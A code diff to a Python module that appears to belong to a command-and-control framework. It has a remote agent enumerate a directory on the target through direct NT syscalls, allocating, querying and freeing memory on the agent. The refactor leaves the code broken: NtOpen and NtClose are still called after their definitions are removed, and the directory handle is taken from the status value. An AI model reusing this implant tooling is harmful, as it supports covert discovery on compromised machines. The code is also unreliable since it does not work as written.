@@ -98,22 +98,17 @@ def parse_file_both_dir_information(data: bytes):
 
     return results
 
-def function(agent_id, args, dependencies):
+def function(agent_id, args):
     from services.orders import read_from_agent
-    NtAlloc = dependencies[0]
-    NtOpen = dependencies[1]
-    NtQuery = dependencies[2]
-    NtClose = dependencies[3]
-    NtFree = dependencies[4]
     
     dir_path = args[0] if args[0].startswith("\\??\\") else "\\??\\" + args[0]
     buf_size = 8192
 
     # 1. ALLOCATE MEMORY (RW) for the results buffer
-    # NtAlloc returns a pointer to the newly allocated 8KB region
-    alloc_ret = NtAlloc(agent_id, [buf_size, 0x04]) # MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+    # NtAllocateVirtualMemoryreturns a pointer to the newly allocated 8KB region
+    alloc_ret = NtAllocateVirtualMemory(agent_id, [buf_size, 0x04]) # MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
     
-    if alloc_ret["NTSTATUS"] == 0:
+    if alloc_ret["retval"] == 0:
         target_buf_ptr = alloc_ret["allocated_memory"]
         print(f"[*] Allocated {buf_size} bytes at {hex(target_buf_ptr)} for enumeration.")
 
@@ -121,16 +116,16 @@ def function(agent_id, args, dependencies):
         # Using our OpenFile component to get the dir handle
         open_ret = NtOpen(agent_id, [dir_path, 0x00100001])
         
-        if open_ret["NTSTATUS"] == 0:
-            dir_handle = open_ret["FILE_HANDLE"]
+        if open_ret["retval"] == 0:
+            dir_handle = open_ret["retval"]
             
             # 3. QUERY THE DIRECTORY CONTENTS
             # We call NtQueryDirectoryFile with the REMOTE buffer pointer we just allocated
             # args: [handle, buffer_ptr, buffer_size]
 
-            query_ret = NtQuery(agent_id, [dir_handle, target_buf_ptr, buf_size])
+            query_ret = NtQueryDirectoryFile(agent_id, [dir_handle, target_buf_ptr, buf_size])
             
-            if query_ret["NTSTATUS"] == 0:
+            if query_ret["retval"] == 0:
                 # 4. Success! (The results are now in target_buf_ptr)
                 # You might need a way to read this remote buffer back to the UI.
                 # For now, we return the status and the location.
@@ -151,18 +146,18 @@ def function(agent_id, args, dependencies):
                 # 6. CLEANUP: DEALLOCATE MEMORY
                 # NtFreeVirtualMemory (Syscall 0x1E)
                 # args: [base_addr, size, free_type]
-                free_ret = NtFree(agent_id, [target_buf_ptr, buf_size]) # MEM_RELEASE
-                if free_ret["NTSTATUS"] != 0:
-                    print(f"[!] Warning: NtFree failed with {hex(free_ret['NTSTATUS'])}")
+                free_ret = NtFreeVirtualMemory(agent_id, [target_buf_ptr, buf_size]) # MEM_RELEASE
+                if free_ret["retval"] != 0:
+                    print(f"[!] Warning: NtFreeVirtualMemory failed with {hex(free_ret['retval'])}")
                 
                 return results
 
             else:
                 NtClose(agent_id, [dir_handle])
-                NtFree(agent_id, [target_buf_ptr, 0])
-                return {"Result": f"Error in NtQueryDirectoryFile: {hex(query_ret['NTSTATUS'])}"}
+                NtFreeVirtualMemory(agent_id, [target_buf_ptr, 0])
+                return {"Result": f"Error in NtQueryDirectoryFile: {hex(query_ret['retval'])}"}
         else:
-            NtFree(agent_id, [target_buf_ptr, 0])
-            return {"Result": f"Error in NtOpenFile: {hex(open_ret['NTSTATUS'])}"}
+            NtFreeVirtualMemory(agent_id, [target_buf_ptr, 0])
+            return {"Result": f"Error in NtOpenFile: {hex(open_ret['retval'])}"}
     else:
-        return {"Result": f"Error in NtAllocateVirtualMemory: {hex(alloc_ret['NTSTATUS'])}"}
+        return {"Result": f"Error in NtAllocateVirtualMemory: {hex(alloc_ret['retval'])}"}
